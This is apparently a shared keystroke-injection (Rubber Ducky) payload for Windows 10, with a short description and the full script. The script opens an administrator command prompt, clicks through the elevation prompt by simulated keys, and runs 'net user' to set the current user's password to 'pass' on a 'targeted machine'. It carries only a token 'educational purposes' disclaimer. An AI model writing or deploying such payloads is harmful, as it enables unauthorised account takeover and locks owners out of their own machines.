# Payload
This very simple payload change current user's password to something you want in just 1,75 seconds !!
Here, password is set to "pass", you can change it. You can also change delay value if the targeted machine is slower

***
# Code

    REM Based on Admin CMD
    REM Target: Windows 10
    REM Set password to whatever you want, here 'pass' is the current user password after executing this
    DELAY 1000
    WINDOWS d
    DELAY 100
    WINDOWS
    DELAY 100
    STRING cmd
    DELAY 100
    CONTROL SHIFT
    ENTER
    DELAY 150
    LEFTARROW
    DELAY 150
    ENTER
    DELAY 150
    STRING net user %username% pass
    DELAY 100
    STRING exit
    DELAY 50
    ENTER
    REM done by zqrk with love, and for educational purposes only!